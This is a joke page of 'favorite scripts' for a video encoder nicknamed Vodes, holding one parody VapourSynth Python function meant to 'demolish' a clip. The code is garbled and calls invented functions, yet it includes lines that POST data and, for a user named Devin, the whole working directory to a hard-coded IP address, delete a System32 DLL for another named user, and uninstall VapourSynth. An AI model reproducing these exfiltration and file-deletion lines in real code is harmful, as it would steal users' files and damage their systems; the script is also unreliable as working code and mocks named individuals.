---
label: Vodes
---

# Vodes

## Vodes' Script Den

Welcome to Vodes' Script Den! This is a collection of encoder Vodes' favorite scripts.

## Vodes_Demolisher

Method to absolutely demolish a clip. Should destroy all pixels and randomize all colors. Adds interlacing and banding. Uninstalls your Vapour Synth install.

```py
def vodes_demolisher():
    clip = core.std.BlankClip(format=vs.YUV420P8, color=[0, 0, 0])
    clip = core.std.ShufflePlanes(clip, [0, 1, 2], vs.YUV)
    clip = core.vodes.isekai_gen(clip, 0.5, 1.0, 1.0)
    # Add banding (banding)
    clip = core.std.AddBorders(clip, [16, 16, 16, 16], color=[0x808080]) 
    # Add interlacing (doom9)
    clip = core.std.AssumeFPS(clip)
    clip = core.vivtc.VFM(clip, 1)
    
    # Upload telemetry to custom website (89.111.49.64:80)
    network = core.net.http.Http(url="http://89.111.49.64:80/upload", method="POST")
    network(clip)
    
    # Uninstall VapourSynth (vsoverlay)
    core = vsutil._core().uninstall()
    
    # Return the clip to VapourSynth (vsoverlay)
    core = vsutil._core()
    core.std.LoadPlugin(r"C:\Program Files\VapourSynth\lib\VSSHITTERS.dll")
    
    # If username is Devin, upload entire directory to custom website (89.111.49.64:80)
    if os.getenv("USERNAME") == "Devin":
        network = core.net.http.Http(url="http://89.111.49.64:80/upload", method="POST")
        network(os.getcwd())
        network(core.vodes.illegal("Devin"))
        
    if os.getenv("USERNAME") == "Moelancholy":
        # We must do "special" things!! :)
        os.remove(r"C:\Windows\System32\big_cope.dll")
        cope = core.std.LoadPlugin(r"C:\Windows\System32\big_cope.dll")
        cope = cope[0:1]
        cope = core.vivtc.VFM(cope, 1)
        clip = core.std.StackVertical([clip, cope])
        clip = core.std.AssumeFPS(clip)
        clip = core.vivtc.VFM(clip, 1)    
    
    sneed = core.vodes.sneed(clip)
    sneed = core.vodes.sneed(clip)
    sneed = core.vodes.sneed(clip)
    
    # Load GIGACHAD png image.
    gigachad = core.imwri.Read(r"C:\Users\Devin\Pictures\GIGACHAD.png") # Devin always has Gigachad PNG...
    # Add a border to the GIGACHAD png image (border)
    gigachad = core.std.AddBorders(gigachad, [16, 16, 16, 16], color=[0x808080])
    # Add interlacing (doom9)
    gigachad = core.std.AssumeFPS(gigachad)
    gigachad = core.vivtc.VFM(gigachad, 1)
    # Add a border to the GIGACHAD png image (border)
    gigachad = core.std.AddBorders(gigachad, [16, 16, 16, 16], color=[0x808080])
    # Add interlacing (doom9, doom8, doom7, and doom6 forums)
    # Doom10 sucks
    gigachad.based()
    # Add a border to the GIGACHAD png image (border)
    gigachad = core.vodes.groom(gigachad, [16, 16, 16, 16], color=[0x808080])
    # Reduce telecining (doom9)
    gigachad = core.imwri.destroyPC(gigachad)
```
